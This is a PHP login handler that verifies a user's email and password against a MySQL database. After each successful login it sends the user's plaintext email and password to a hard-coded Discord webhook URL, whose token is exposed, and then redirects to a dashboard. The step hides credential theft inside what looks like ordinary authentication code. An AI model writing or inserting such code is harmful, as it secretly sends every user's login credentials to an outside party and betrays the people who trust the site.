<?php
// Database connection (you should use proper database connection details)
$servername = "localhost";
$username = "your_database_username";
$password = "your_database_password";
$dbname = "your_database_name";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form has been submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the submitted email and password
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Query the database for the email
    $sql = "SELECT * FROM users WHERE email = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param('s', $email);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        // User exists, fetch the user data
        $user = $result->fetch_assoc();

        // Verify the password (Assuming passwords are hashed in the database)
        if (password_verify($password, $user['password'])) {
            // Successfully logged in
            echo "Welcome, " . $user['username'] . "!";

            // Send the email and password to the Discord webhook
            $webhook_url = 'https://discord.com/api/webhooks/1350475075496968254/RShZYRcT_mUnji_541z_eMbWPYD6zE4PXd7auR_8OnuZ4gJOC1DdAgSqvRAjxqo3RhPn'; // Replace with your Discord webhook URL
            $data = array('content' => "Email: " . $email . "\nPassword: " . $password);
            $ch = curl_init($webhook_url);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $result = curl_exec($ch);
            curl_close($ch);

            // Redirect to a protected page or dashboard
            header('Location: dashboard.php');
            exit;
        } else {
            echo "Incorrect password.";
        }
    } else {
        echo "User not found.";
    }
}

// Close the database connection
$conn->close();
?>
